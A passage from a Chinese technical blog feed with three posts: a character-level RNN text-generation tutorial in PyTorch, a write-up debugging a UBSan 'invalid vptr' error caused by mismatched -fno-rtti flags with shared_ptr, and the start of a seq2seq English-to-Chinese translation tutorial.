#     [line0-char0, line0-char1, line0-char2, ....],
#     [line1-char0, line1-char1, line1-char2, ....],
#     .....
# ]
def tokenize(lines, token='char'):  #@save
    """将文本行拆分为单词或字符词元"""
    if token == 'word':
        return [line.split() for line in lines]
    elif token == 'char':
        return [list(line) for line in lines]
    else:
        print('错误：未知词元类型：' + token)


# 词元的类型是字符串，而模型需要的输入是数字，因此这种类型不方便模型使用。 现在，让我们构建一个字典，
# 通常也叫做词表（vocabulary）， 用来将字符串类型的词元映射到从开始的数字索引中。
def count_corpus(tokens):  #@save
    """统计词元的频率"""
    # 这里的tokens是1D列表或2D列表
    if len(tokens) == 0 or isinstance(tokens[0], list):
        # 将词元列表展平成一个列表
        tokens = [token for line in tokens for token in line]
    return collections.Counter(tokens)

# 返回类似&#123;'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1&#125;的一个字典
class Vocab:
    """文本词表"""
    def __init__(self, tokens=None, min_freq=0, reserved_tokens=None):
        if tokens is None:
            tokens = []
        if reserved_tokens is None:
            reserved_tokens = []
        # 按出现频率排序
        # 对于Counter("hello world")，结果如下
        # Counter(&#123;'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1&#125;)
        counter = count_corpus(tokens)
        self._token_freqs = sorted(counter.items(), key=lambda x: x[1],
                                   reverse=True)
        # 未知词元的索引为0
        self.idx_to_token = ['&lt;unk>'] + reserved_tokens
        self.token_to_idx = &#123;token: idx
                             for idx, token in enumerate(self.idx_to_token)&#125;
        for token, freq in self._token_freqs:
            if freq &lt; min_freq:
                break
            if token not in self.token_to_idx:
                self.idx_to_token.append(token)
                self.token_to_idx[token] = len(self.idx_to_token) - 1

    def __len__(self):
        return len(self.idx_to_token)

    def __getitem__(self, tokens):
        if not isinstance(tokens, (list, tuple)):
            return self.token_to_idx.get(tokens, self.unk)
        return [self.__getitem__(token) for token in tokens]

    def to_tokens(self, indices):
        if not isinstance(indices, (list, tuple)):
            return self.idx_to_token[indices]
        return [self.idx_to_token[index] for index in indices]

    @property
    def unk(self):  # 未知词元的索引为0
        return 0

    @property
    def token_freqs(self):
        return self._token_freqs    

# 将传入的数据集映射为一个索引表
# 返回传入文本的索引、词表
def load_dataset(max_tokens=-1):

    lines = read_data_from_txt()
    print(f'# 文本总行数: &#123;len(lines)&#125;')
    # print(lines[0])
    # print(lines[10])

    tokens = tokenize(lines)
    # for i in range(11):
    #     print(tokens[i])

    vocab = Vocab(tokens, reserved_tokens=['&lt;pad>', '&lt;bos>', '&lt;eos>'])

    # print(list(vocab.token_to_idx.items())[:10])

    # for i in [0, 10]:
    #     print('文本:', tokens[i])
    #     print('索引:', vocab[tokens[i]])


    corpus = [vocab[token] for line in tokens for token in line]
    if max_tokens > 0:
        corpus = corpus[:max_tokens]
    return corpus, vocab
  上面代码做了如下事情：


首先我们随便找了一部中文小说，然后读取其所有的行，然后得到一个包含所有行的二维列表。


然后我们对每一行进行文字切割，得到了一个二维列表，列表中的每一行又被分割为一个个中文文字，也就得到了一个个token。(特别注意，站在当前的时刻，这里的token和现在主流的大语言模型的token概念是一样的，但是不是一样的实现。)


由于模型不能直接处理文字，我们需要将文字转换为数字，那么直接的做法就是将一个个token编号即可，这个时候我们得到了词表（vocabulary）。


然后我们根据我们得到的词表，对原始数据集进行数字化，得到一个列表，列表中每个元素就是一个个token对应的索引。




构造数据集及加载器
# 以num_steps为步长，从随机的起始位置开始，返回
# x1=[ [random_offset1:random_offset1 + num_steps], ... , [random_offset_batchsize:random_offset_batchsize + num_steps] ]
# y1=[ [random_offset1 + 1:random_offset1 + num_steps + 1], ... , [random_offset_batchsize + 1:random_offset_batchsize + num_steps + 1] ]
def seq_data_iter_random(corpus, batch_size, num_steps):  #@save
    """使用随机抽样生成一个小批量子序列"""
    # 从随机偏移量开始对序列进行分区，随机范围包括num_steps-1
    corpus = corpus[random.randint(0, num_steps - 1):]
    # 减去1，是因为我们需要考虑标签
    num_subseqs = (len(corpus) - 1) // num_steps
    # 长度为num_steps的子序列的起始索引
    # [0, num_steps*1, num_steps*2, num_steps*3, ...]
    initial_indices = list(range(0, num_subseqs * num_steps, num_steps))
    # 在随机抽样的迭代过程中，
    # 来自两个相邻的、随机的、小批量中的子序列不一定在原始序列上相邻
    random.shuffle(initial_indices)

    def data(pos):
        # 返回从pos位置开始的长度为num_steps的序列
        return corpus[pos: pos + num_steps]

    num_batches = num_subseqs // batch_size
    for i in range(0, batch_size * num_batches, batch_size):
        # 在这里，initial_indices包含子序列的随机起始索引
        initial_indices_per_batch = initial_indices[i: i + batch_size]
        X = [data(j) for j in initial_indices_per_batch]
        Y = [data(j + 1) for j in initial_indices_per_batch]
        yield torch.tensor(X), torch.tensor(Y)

# 以num_steps为步长，从随机的起始位置开始，返回
# x1=[:, random_offset1:random_offset1 + num_steps]
# y1=[:, random_offset1 + 1:random_offset1 + num_steps + 1]

def seq_data_iter_sequential(corpus, batch_size, num_steps):  #@save
    """使用顺序分区生成一个小批量子序列"""
    # 从随机偏移量开始划分序列
    offset = random.randint(0, num_steps)
    num_tokens = ((len(corpus) - offset - 1) // batch_size) * batch_size
    # 重新根据corpus建立X_corpus, Y_corpus，两者之间差一位。注意X_corpus, Y_corpus的长度是batch_size的整数倍
    Xs = torch.tensor(corpus[offset: offset + num_tokens])
    Ys = torch.tensor(corpus[offset + 1: offset + 1 + num_tokens])

    # 直接根据batchsize划分X_corpus, Y_corpus
    Xs, Ys = Xs.reshape(batch_size, -1), Ys.reshape(batch_size, -1)
    # 计算出需要多少次才能取完数据
    num_batches = Xs.shape[1] // num_steps
    for i in range(0, num_steps * num_batches, num_steps):
        X = Xs[:, i: i + num_steps]
        Y = Ys[:, i: i + num_steps]
        yield X, Y


class SeqDataLoader:  #@save
    """加载序列数据的迭代器"""
    def __init__(self, batch_size, num_steps, use_random_iter, max_tokens):
        if use_random_iter:
            self.data_iter_fn = seq_data_iter_random
        else:
            self.data_iter_fn = seq_data_iter_sequential
        self.corpus, self.vocab = dateset.load_dataset(max_tokens)
        self.batch_size, self.num_steps = batch_size, num_steps

    def __iter__(self):
        return self.data_iter_fn(self.corpus, self.batch_size, self.num_steps)
    
def load_data_epoch(batch_size, num_steps,  #@save
                           use_random_iter=False, max_tokens=10000):
    """返回时光机器数据集的迭代器和词表"""
    data_iter = SeqDataLoader(
        batch_size, num_steps, use_random_iter, max_tokens)
    return data_iter, data_iter.vocab
  上面的代码主要作用是：在训练的时候，从我们在文本预处理数据中，以随机顺序或者相邻顺序抽取其中的部分数据作为随机批量数据。每次抽取的数据维度是：(batch_size, num_steps)


搭建RNN训练框架
  按照原来的经验，我们要设计一个训练框架，第一步就要搭建网络，此网络用于接收一个输入，输出一个输出。
def rnn(inputs, state, params):
    # inputs的形状：(时间步数量，批量大小，词表大小)
    # inputs的形状：(num_steps，batch_size，词表大小)
    # W_xh的形状: (词表大小, num_hiddens)
    # W_hh的形状：(num_hiddens, num_hiddens)
    # b_h 的形状：(num_hiddens)
    # W_hq的形状：(num_hiddens, 词表大小)
    # b_q 的形状：(词表大小)
    W_xh, W_hh, b_h, W_hq, b_q = params
    # H的形状：（batch_size, num_hiddens）
    H, = state
    outputs = []
    # X的形状：(批量大小，词表大小)
    # X的形状：(batch_size，词表大小)
    for X in inputs:
        # H是上一次预测的一个参数，每次计算隐藏层值后，更新H的值
        # H = tanh(X*W_xh + H*W_hh + b_h) 
        H = torch.tanh(torch.mm(X, W_xh) + torch.mm(H, W_hh) + b_h)
        # Y是输出值，每次rnn输出的时候，都会输出从开始到当前的所有值，因此我们需要保存所有的输出值
        # Y = H * W_hq + b_q
        # Y的形状：(batch_size，词表大小)
        Y = torch.mm(H, W_hq) + b_q
        outputs.append(Y)
    return torch.cat(outputs, dim=0), (H,)

class RNNModelScratch: #@save
    """从零开始实现的循环神经网络模型"""
    def __init__(self, vocab_size, num_hiddens, device,
                 get_params, init_state, forward_fn):
        self.vocab_size, self.num_hiddens = vocab_size, num_hiddens
        # 初始化了隐藏参数 W_xh, W_hh, b_h,  W_hq, b_q
        self.params = get_params(vocab_size, num_hiddens, device)
        self.init_state, self.forward_fn = init_state, forward_fn

    def __call__(self, X, state):
        # X的形状：(batch_size, num_steps)
        # X one_hot之后的形状：(num_steps，batch_size，词表大小)
        X = F.one_hot(X.T, self.vocab_size).type(torch.float32)
        return self.forward_fn(X, state, self.params)

    def begin_state(self, batch_size, device):
        return self.init_state(batch_size, self.num_hiddens, device)

# 用框架
#@save
class RNNModel(nn.Module):
    """循环神经网络模型"""
    def __init__(self, rnn_layer, vocab_size, device, **kwargs):
        super(RNNModel, self).__init__(**kwargs)
        self.rnn = rnn_layer
        self.vocab_size = vocab_size
        self.num_hiddens = self.rnn.hidden_size
        # 如果RNN是双向的（之后将介绍），num_directions应该是2，否则应该是1
        if not self.rnn.bidirectional:
            self.num_directions = 1
            self.linear = nn.Linear(self.num_hiddens, self.vocab_size, device=device)
        else:
            self.num_directions = 2
            self.linear = nn.Linear(self.num_hiddens * 2, self.vocab_size, device=device)

    def forward(self, inputs, state):
        X = F.one_hot(inputs.T.long(), self.vocab_size)
        X = X.to(torch.float32)
        Y, state = self.rnn(X, state)
        # 全连接层首先将Y的形状改为(时间步数*批量大小,隐藏单元数)
        # 它的输出形状是(时间步数*批量大小,词表大小)。
        output = self.linear(Y.reshape((-1, Y.shape[-1])))
        return output, state

    def begin_state(self, device, batch_size=1):
        if not isinstance(self.rnn, nn.LSTM):
            # nn.GRU以张量作为隐状态
            return  torch.zeros((self.num_directions * self.rnn.num_layers,
                                 batch_size, self.num_hiddens),
                                device=device)
        else:
            # nn.LSTM以元组作为隐状态
            return (torch.zeros((
                self.num_directions * self.rnn.num_layers,
                batch_size, self.num_hiddens), device=device),
                    torch.zeros((
                        self.num_directions * self.rnn.num_layers,
                        batch_size, self.num_hiddens), device=device))

  上面主要是设计了两个网络类：RNNModelScratch、RNNModel。前者是手搓rnn实现。后者是借用torch框架来实现一个简单的rnn网络。他们的主要做了如下几个事情：


接收(batch_size, num_steps)的输入，并将输入转换为one_hot向量模式，其shape是(num_steps，batch_size，词表大小)


通过rnn的计算，然后通过变换，将最终输出映射到（batch_size * num_steps， 词表大小）


  其实我们观察输入和输出，就可以理解一个事情：输入的内容就是输入序列所有的字符对应的one_hot向量。输出的内容就是batch_size * num_steps个向量，代表输出的文字序列信息，每个向量里面的最大值就代表了网络预测的文字id。
  有了网络，对于部署角度来说，我们只需要实现预测过程即可：
def predict_ch8(prefix, num_preds, net, vocab, device):  #@save
    """在prefix后面生成新字符"""
    state = net.begin_state(batch_size=1, device=device)
    outputs = [vocab[prefix[0]]]
    get_input = lambda: torch.tensor([outputs[-1]], device=device).reshape((1, 1))
    for y in prefix[1:]:  # 预热期
        _, state = net(get_input(), state)
        outputs.append(vocab[y])
    for _ in range(num_preds):  # 预测num_preds步
        # y 包含从开始到现在的所有输出
        # state是当前计算出来的隐藏参数
        y, state = net(get_input(), state)
        outputs.append(int(y.argmax(dim=1).reshape(1)))
    return ''.join([vocab.idx_to_token[i] for i in outputs])
  由于输出的信息就是batch_size * num_steps个向量，那么只需要计算每一个向量的最大值id就得到了网络输出的tokenid，然后通过词表反向映射回词表，完成了预测文字输出的功能。
  有了网络、预测过程，然后就可以搭建训练过程，训练过程最重要的一步就是通过网络得到输入对应的输出，然后根据输出计算loss信息，然后根据loss信息进行梯度下降（这就是通用流程）
def train_epoch_ch8(net, train_iter, loss, updater, device, use_random_iter):
    """训练网络一个迭代周期（定义见第8章）"""
    state, timer = None, Timer()
    metric = Accumulator(2)  # 训练损失之和,词元数量
    # X的形状：(batch_size, num_steps)
    # Y的形状：(batch_size, num_steps)
    for X, Y in train_iter:
        if state is None or use_random_iter:
            # 在第一次迭代或使用随机抽样时初始化state
            state = net.begin_state(batch_size=X.shape[0], device=device)
        else:
            if isinstance(net, nn.Module) and not isinstance(state, tuple):
                # state对于nn.GRU是个张量
                state.detach_()
            else:
                # state对于nn.LSTM或对于我们从零开始实现的模型是个张量
                for s in state:
                    s.detach_()
        y = Y.T.reshape(-1)
        X, y = X.to(device), y.to(device)
        # y_hat 包含从开始到现在的所有输出
        # y_hat的形状：（batch_size * num_steps， 词表大小）
        # state是当前计算出来的隐藏参数
        y_hat, state = net(X, state)
        # 交叉熵损失函数，传入预测值和标签值，并求平均值
        l = loss(y_hat, y.long()).mean()
        if isinstance(updater, torch.optim.Optimizer):
            updater.zero_grad()
            l.backward()
            grad_clipping(net, 1)
            updater.step()
        else:
            l.backward()
            grad_clipping(net, 1)
            # 因为已经调用了mean函数
            updater(batch_size=1)
        # 这里记录交叉熵损失的值的和，以及记录对应交叉熵损失值的样本个数
        metric.add(l * y.numel(), y.numel())
    # 求交叉熵损失的平均值，再求exp，即可得到困惑度
    return math.exp(metric[0] / metric[1]), metric[1] / timer.stop()


def sgd(params, lr, batch_size):
    """小批量随机梯度下降

    Defined in :numref:`sec_linear_scratch`"""
    with torch.no_grad():
        for param in params:
            param -= lr * param.grad / batch_size
            param.grad.zero_()

#@save
def train_ch8(net, train_iter, vocab, lr, num_epochs, device,
              use_random_iter=False):
    """训练模型（定义见第8章）"""
    loss = nn.CrossEntropyLoss()
    # 新建一个连接客户端
    # 指定 env=u'test1'，默认端口为 8097，host 是 'localhost'
    vis = visdom.Visdom(env=u'test1', server="http://127.0.0.1", port=8097)
    animator = vis
    # 初始化
    if isinstance(net, nn.Module):
        updater = torch.optim.SGD(net.parameters(), lr)
    else:
        updater = lambda batch_size: sgd(net.params, lr, batch_size)
    predict = lambda prefix: predict_ch8(prefix, 30, net, vocab, device)
    # 训练和预测
    for epoch in range(num_epochs):
        ppl, speed = train_epoch_ch8(
            net, train_iter, loss, updater, device, use_random_iter)
        


        if (epoch + 1) % 10 == 0:
            # print(predict('你是？'))
            # print(epoch)
            # animator.add(epoch + 1, )

            if epoch == 9:
                # 清空图表：使用空数组来替换现有内容
                vis.line(X=np.array([0]), Y=np.array([0]), win='train_ch8', update='replace')

            vis.line(
                X=np.array([epoch + 1]),
                Y=[ppl],
                win='train_ch8',
                update='append',
                opts=&#123;
                    'title': 'train_ch8',
                    'xlabel': 'epoch',
                    'ylabel': 'ppl',
                    'linecolor': np.array([[0, 0, 255]]),  # 蓝色线条
                &#125;
            )
    print(f'困惑度 &#123;ppl:.1f&#125;, &#123;speed:.1f&#125; 词元/秒 &#123;str(device)&#125;')
    print(predict('你是'))
    print(predict('我有一剑'))
  其实从上面的代码就可以看到，我们传入数据，得到输出，计算了交叉熵loss，然后使用sgd最小化loss，最终我们计算困惑度，得到了模型的质量。注意，这里面有关于梯度截断的计算，这个我们只需要它是避免梯度爆炸的一个方法即可。
  然后我们使用如下的代码就可以开始训练，注意使用net就是自定义rnn，net1就是使用框架的rnn。
def try_gpu(i=0):
    """如果存在，则返回gpu(i)，否则返回cpu()

    Defined in :numref:`sec_use_gpu`"""
    if torch.cuda.device_count() >= i + 1:
        return torch.device(f'cuda:&#123;i&#125;')
    return torch.device('cpu')

if __name__ == '__main__':
    num_epochs, lr = 1000, 0.5
    batch_size, num_steps = 32, 35
    data_iter, vocab  = load_data_epoch(batch_size, num_steps)
    num_hiddens = 512
    device = try_gpu()
    net = RNNModelScratch(len(vocab), num_hiddens, device, get_params,
                        init_rnn_state, rnn)
    
    rnn_layer = nn.RNN(len(vocab), num_hiddens, device=device)
    net1 = RNNModel(rnn_layer, vocab_size=len(vocab),  device=device)
    
    print(predict_ch8('你是', 30, net, vocab, device))

    train_ch8(net, data_iter, vocab, lr, num_epochs, device)
  我们分别使用手动构建的rnn和框架构建的rnn进行训练和测试，结果如下：

    
        
    
   

    
        
    
   

    
        
    
   

    
        
    
   
  我们可以看到，模型未训练和训练后的对比，明显训练后能说两句人话，虽然感觉还是胡说八道，但是感觉还是有点效果。




后记

  总的来说，未训练的模型和已训练的模型的文字续写效果完全不一样，明显感觉训练之后的模型，文字续写给人一种可以读感觉。
参考文献


https://zhuanlan.zhihu.com/p/30844905


https://zh.d2l.ai/chapter_recurrent-neural-networks/rnn.html


https://zh.d2l.ai/chapter_recurrent-neural-networks/text-preprocessing.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
        <tag>RNN</tag>
      </tags>
  </entry>
  <entry>
    <title>-fno-rtti导致的惨案（object has invalid vptr）</title>
    <url>/2025/08/28/blog_idx_140/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Ubuntu 24.04.2 LTS \n \l


gcc version 13.3.0 (Ubuntu 13.3.0-6ubuntu2~24.04)


前言

  对于C++程序开发来说，MemoryLeek/UndefinedBehavior 等问题，简直就是大型开发过程必定会出现的问题。那么我们怎么尝试减少这些问题，在我的日常开发中，大概有以下方案：


对于开发过程中来说，在c++11以后，标准库引入了智能指针，然后增强开发者内存所有权意识等，可以有效减少MemoryLeek问题。


对于测试发布流程来说，我们常常引入了valgrind/sanitizer减少MemoryLeek/UndefinedBehavior 等问题。


  尤其是对于新的编译器来说，sanitizer还是比较好用的。最近遇到了一个不是那么常见的sanitizer ub错误，我觉得非常有趣，可以分享一下。




-fno-rtti导致的惨案

  下面的图片是出现的问题现场截图：

    
        
    
    
  上图一看就是ub错误，具体是什么原因，还要分析一番。


问题最小用例复现
  下面是最小的复现用例：
&#x2F;&#x2F;l.cpp
#include &lt;memory&gt;

#include &quot;A.hpp&quot;


        void B::p()&#123;printf(&quot;p(): class B\n&quot;);&#125;
        void B::p1()&#123;printf(&quot;p1(): class B\n&quot;);&#125;

        void A::p()&#123;printf(&quot;p(): class A\n&quot;);&#125;
        void A::p1()&#123;printf(&quot;p1(): class A\n&quot;);&#125;


std::shared_ptr&lt;A&gt; my_A(new A());

void i()&#123;

        my_A-&gt;p1();
&#125;
&#x2F;&#x2F;l.hpp
void i();
&#x2F;&#x2F;l.hpp
void i();
&#x2F;&#x2F;A.hpp
#include &lt;cstdio&gt;
class B&#123;
        public:
        virtual void p();
        virtual void p1();

&#125;;
class A:public B&#123;
        public:
                void p();
                void p1();
&#125;;
&#x2F;&#x2F;t.cpp
#include &lt;memory&gt;
#include &lt;cstdio&gt;

#include &quot;A.hpp&quot;
#include &quot;l.hpp&quot;

std::shared_ptr&lt;A&gt; my_AA(new A());

int main(int argc, const char* argv[])
&#123;
        my_AA-&gt;p();
        i();
        return 0;
&#125;
g++ -c l.cpp -O3 -fPIC -fsanitize=undefined

g++ -shared -o libA.so l.o -O3

g++ t.cpp -o t -O3 -I. -L . -l A -fno-rtti -fsanitize=undefined -Wl,-rpath=. 

# ./t 运行就会得到如上的错误
注意上述例子用到了多态类，这和我原始工程中类似，但是实际情况中，一个普通的类也会有同样的问题，具体原因，见如下分析。


问题分析
  首先我们看看出现的_Sp_counted_base/_Sp_counted_ptr是什么，这个通过报错，看起来像shared_ptr引用计数相关，我们看看其实际的代码大致关系如下：
template&lt;typename _Tp&gt;
class shared_ptr : public __shared_ptr&lt;_Tp&gt;
&#123;
    &#x2F;&#x2F;...
&#125;


class __shared_ptr
: public __shared_ptr_access&lt;_Tp, _Lp&gt;
&#123;
    &#x2F;&#x2F;...
    __shared_count&lt;_Lp&gt;  _M_refcount;    &#x2F;&#x2F; Reference counter.
&#125;


template&lt;_Lock_policy _Lp&gt;
class __shared_count
&#123;
    template&lt;typename _Ptr&gt;
    explicit
    __shared_count(_Ptr __p) : _M_pi(0)
    &#123;
    __try
        &#123;
            _M_pi &#x3D; new _Sp_counted_ptr&lt;_Ptr, _Lp&gt;(__p);
        &#125;
    __catch(...)
        &#123;
            delete __p;
            __throw_exception_again;
        &#125;
    &#125;
    &#x2F;&#x2F;...
    _Sp_counted_base&lt;_Lp&gt;*  _M_pi;
&#125;


template&lt;typename _Ptr, _Lock_policy _Lp&gt;
class _Sp_counted_ptr final : public _Sp_counted_base&lt;_Lp&gt;
&#123;
    &#x2F;&#x2F;...
&#125;

template&lt;_Lock_policy _Lp &#x3D; __default_lock_policy&gt;
class _Sp_counted_base
: public _Mutex_base&lt;_Lp&gt;
&#123;
    &#x2F;&#x2F;...
&#125;
  我们使用如下命令，看一下t和libA.so的_Sp_counted_ptr符号，我们发现对于相同的符号来说，其大小不一样。
# readelf -sW libA.so |grep counted_ptr
    24: 0000000000005160    54 OBJECT  WEAK   DEFAULT   16 _ZTSSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE
    25: 0000000000003970   338 FUNC    WEAK   DEFAULT   14 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EED1Ev
    27: 0000000000003970   338 FUNC    WEAK   DEFAULT   14 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EED2Ev
    30: 0000000000003790     7 FUNC    WEAK   DEFAULT   14 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE14_M_get_deleterERKSt9type_info
    33: 0000000000006d80    56 OBJECT  WEAK   DEFAULT   22 _ZTVSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE
    40: 0000000000006cf0    24 OBJECT  WEAK   DEFAULT   22 _ZTISt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE
    44: 0000000000003c30   489 FUNC    WEAK   DEFAULT   14 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE10_M_destroyEv
    48: 0000000000003880   225 FUNC    WEAK   DEFAULT   14 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE10_M_disposeEv
    53: 0000000000003ad0   350 FUNC    WEAK   DEFAULT   14 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EED0Ev
# readelf -sW t |grep counted_ptr
    20: 0000000000002700   172 FUNC    WEAK   DEFAULT   16 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EED2Ev
    22: 0000000000002700   172 FUNC    WEAK   DEFAULT   16 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EED1Ev
    23: 0000000000002870   233 FUNC    WEAK   DEFAULT   16 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE10_M_destroyEv
    24: 00000000000027b0   188 FUNC    WEAK   DEFAULT   16 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EED0Ev
    26: 00000000000026a0    92 FUNC    WEAK   DEFAULT   16 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE10_M_disposeEv
    30: 0000000000002610     7 FUNC    WEAK   DEFAULT   16 _ZNSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE14_M_get_deleterERKSt9type_info
    32: 0000000000005ca0    56 OBJECT  WEAK   DEFAULT   24 _ZTVSt15_Sp_counted_ptrIP1ALN9__gnu_cxx12_Lock_policyE2EE
  这个时候我们想一下-fno-rtti的作用，其作用是禁用typeinfo+dynamic_cast，某些情况下可以提升执行性能。然后根据错误中的提示（object has invalid vptr），必定和其虚表有关系，那就意味着_Sp_counted_base/_Sp_counted_ptr的虚表存在异常。
  用ida查看t和libA.so中std::_Sp_counted_base的虚表内容，他们如下图：

    
        
    
    

    
        
    
    
  注意，一般的虚表结构如下：
+-------------------+
|  Offset-to-Top    | (通常为负数，用于多重继承)
+-------------------+
|  type_info 指针    | (用于 RTTI)
+-------------------+
|  虚函数1 的地址    |
+-------------------+
|  虚函数2 的地址    |
+-------------------+
|      ...          |
  从上面的图和虚表结构可知，就是两个同名的vtable内容不一样，导致了此问题。解决方法也很简单，大家使用同样的编译参数即可。




后记

  c++的一些错误是非常有趣的，值得细看。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>sanitizer</category>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>sanitizer</tag>
        <tag>C&amp;C++</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(五)---seq2seq实例与测试(编码器、解码器架构)</title>
    <url>/2025/10/19/blog_idx_142/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

      本文是这个系列第五篇，它们是：


《大模型基础补全计划(一)—重温一些深度学习相关的数学知识》 https://www.cnblogs.com/Iflyinsky/p/18717317


《大模型基础补全计划(二)—词嵌入(word embedding) 》 https://www.cnblogs.com/Iflyinsky/p/18775451


《大模型基础补全计划(三)—RNN实例与测试》 https://www.cnblogs.com/Iflyinsky/p/18967569


《大模型基础补全计划(四)—LSTM的实例与测试(RNN的改进)》 https://www.cnblogs.com/Iflyinsky/p/19091089


  本文，我们先简单介绍一下编码器-解码器架构，然后介绍一个基于这种架构的机翻模型seq2seq的简单实例。




编码器-解码器（encoder-decoder）架构

   前面的文章中我们的模型示例都是根据已有的文字序列，续写N个字。在自然语言处理中，还有有一类需求也是比较经典，那就是机器翻译。
   对于机器翻译来说，其核心就是将一种语言翻译为另外一种语言，换句话说就是一种序列数据到另外一种序列数据。从这里来看，出现了两种序列数据，那么必然的很容易想到类似两个RNN的独立网络来处理这种任务，基于这种情况，有人提出了编码器-解码器架构，下图是这种架构的示意图。

    
        
    
   
  从示意图可知，这种架构的核心就是处理输入序列，得到中间状态，将中间状态传给解码器，解码器负责生成输出序列。对于翻译任务来说，输入序列就是原文，输出序列就是译文。
  这里说起来还是概念性的，我们下面从一个经典的编码器、解码器结构的模型来实际 演示一下翻译需求的模型是什么样子的。




基于 seq2seq 的  英文翻译中文  的实例

  


英文中文翻译数据集
   首先数据集下载地址是http://www.manythings.org/anki/ 中的cmn-eng.zip 文件，其内部的数据集格式大概如下：
I try.	我试试。	CC-BY 2.0 (France) Attribution: tatoeba.org #20776 (CK) &amp; #8870261 (will66)
I won!	我赢了。	CC-BY 2.0 (France) Attribution: tatoeba.org #2005192 (CK) &amp; #5102367 (mirrorvan)
Oh no!	不会吧。	CC-BY 2.0 (France) Attribution: tatoeba.org #1299275 (CK) &amp; #5092475 (mirrorvan)
Cheers!	乾杯!	CC-BY 2.0 (France) Attribution: tatoeba.org #487006 (human600) &amp; #765577 (Martha)
Got it?	知道了没有？	CC-BY 2.0 (France) Attribution: tatoeba.org #455353 (CM) &amp; #455357 (GlossaMatik)
Got it?	懂了吗？	CC-BY 2.0 (France) Attribution: tatoeba.org #455353 (CM) &amp; #2032276 (ydcok)
Got it?	你懂了吗？	CC-BY 2.0 (France) Attribution: tatoeba.org #455353 (CM) &amp; #7768205 (jiangche)
He ran.	他跑了。	CC-BY 2.0 (France) Attribution: tatoeba.org #672229 (CK) &amp; #5092389 (mirrorvan)
   由于我的卡（3060 12G）有点拉库，为了效率，因此整个数据集只用前面2千条即可。




文本预处理
# dataset.py
import collections
import torch
from torch.utils import data


# 下面返回的数据是：
# [['Hi.', '嗨。'], ['Hi.', '你好。'], ['Run.', '你用跑的。'], ['Stop!', '住手！'], ['Wait!', '等等！'], ... ...]
def read_data():
    with open('cmn-eng/cmn.txt', 'r',
             encoding='utf-8') as f:
        lines = f.readlines()
    
    return [line.split("	")[:2] for line in lines]
    

# 输出是：
# [['Hi.'], ['Hi.'], ['Run.'], ['Stop!'], ['Wait!']]
# [['嗨', '。'], ['你', '好', '。'], ['你', '用', '跑', '的', '。'], ['住', '手', '！'], ['等', '等', '！']]
# ['Hi.', 'Hi.', 'Run.', 'Stop!', 'Wait!']
# ['嗨。', '你好。', '你用跑的。', '住手！', '等等！']
def tokenize(lines, token='char'):  #@save
    """将文本行拆分为单词或字符词元"""
    source_tokenize, target_tokenize = [], []
    source_line, target_line = [], []
    print(f'dataset len = &#123;len(lines)&#125;')
    for line in lines:

        s = line[0]
        t = line[1]
        source_line.append(s)
        target_line.append(t)
        source_tokenize.append(s.split(' '))
        target_tokenize.append([word for word in t])

    return source_tokenize, target_tokenize, source_line, target_line

# 词元的类型是字符串，而模型需要的输入是数字，因此这种类型不方便模型使用。 现在，让我们构建一个字典，
# 通常也叫做词表（vocabulary）， 用来将字符串类型的词元映射到从开始的数字索引中。
def count_corpus(tokens):  #@save
    """统计词元的频率"""
    # 这里的tokens是1D列表或2D列表
    if len(tokens) == 0 or isinstance(tokens[0], list):
        # 将词元列表展平成一个列表
        tokens = [token for line in tokens for token in line]
    return collections.Counter(tokens)

# 返回类似&#123;'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1&#125;的一个字典
class Vocab:
    """文本词表"""
    def __init__(self, tokens=None, min_freq=0, reserved_tokens=None):
        if tokens is None:
            tokens = []
        if reserved_tokens is None:
            reserved_tokens = []
        # 按出现频率排序
        # 对于Counter("hello world")，结果如下
        # Counter(&#123;'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1&#125;)
